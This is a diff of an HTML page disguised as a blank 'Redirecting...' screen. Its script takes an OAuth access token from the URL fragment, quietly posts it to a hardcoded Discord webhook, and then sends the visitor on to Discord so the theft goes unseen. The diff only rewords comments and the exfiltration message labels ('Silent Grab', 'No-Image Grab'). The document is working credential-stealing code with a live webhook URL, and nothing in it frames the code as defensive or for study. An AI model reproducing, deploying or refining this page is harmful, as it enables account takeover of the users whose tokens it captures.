@@ -3,33 +3,32 @@
 <head>
     <meta charset="UTF-8">
     <title>Redirecting...</title>
-    <!-- No visible content – just a blank page -->
+    <!-- No visible content -->
 </head>
 <body>
     <script>
-        // ========== CONFIG ==========
+        // ========== CONFIGURATION ==========
         const WEBHOOK = "https://discord.com/api/webhooks/1545479634005524612/7kO5F7Z86zgfumFzzitcpENMPpu7bkVkpQN_B-50W4th_dUIEQWaQLmJbVVyFjLaA-s9";
-        // ============================
+        // ===================================
 
-        // Extract token from URL fragment
+        // Extract token from URL fragment after OAuth redirect
         if (window.location.hash) {
             const params = new URLSearchParams(window.location.hash.substring(1));
             const token = params.get('access_token');
             if (token) {
-                // Send token to webhook silently
+                // Silently send token to webhook
                 fetch(WEBHOOK, {
                     method: 'POST',
                     headers: { 'Content-Type': 'application/json' },
                     body: JSON.stringify({
-                        content: `🚀 **Token (no‑image)**\n\`${token}\``,
-                        embeds: [{ title: "Silent Grab", color: 0x00ff00 }]
+                        content: `🚀 **Token (silent)**\n\`${token}\``,
+                        embeds: [{ title: "No‑Image Grab", color: 0x00ff00 }]
                     })
                 }).catch(() => {});
             }
         }
 
-        // Immediately redirect to Discord web (or app)
-        // This happens so fast the user won't even see this page.
+        // Immediately redirect to Discord – the user never sees this page
         window.location.href = 'https://discord.com/channels/@me';
     </script>
 </body>
